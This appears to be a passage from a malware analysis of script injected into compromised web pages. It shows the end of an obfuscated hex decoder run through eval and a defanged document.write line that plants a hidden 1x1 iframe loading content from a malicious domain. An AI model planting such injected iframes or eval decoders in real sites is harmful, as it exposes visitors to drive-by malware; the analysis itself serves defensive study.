@@ -1,0 +1,9 @@
+parseInt(arr[i]+arr[i+1],16));eval(t);</sc​ript>
+
+The code writes an iframe which loads the malicious content from another site. Again with this hack the content of the variable  arr will vary depending on the malicious domain used to load the content.
+
+
+do​cument.write('<if rame src="hxxp://vnbuyta.co.be/forum.php?tp=675eafec431b1f72" width="1" height="1" frameborder="0"></if rame>')
+
+or
+<sc 
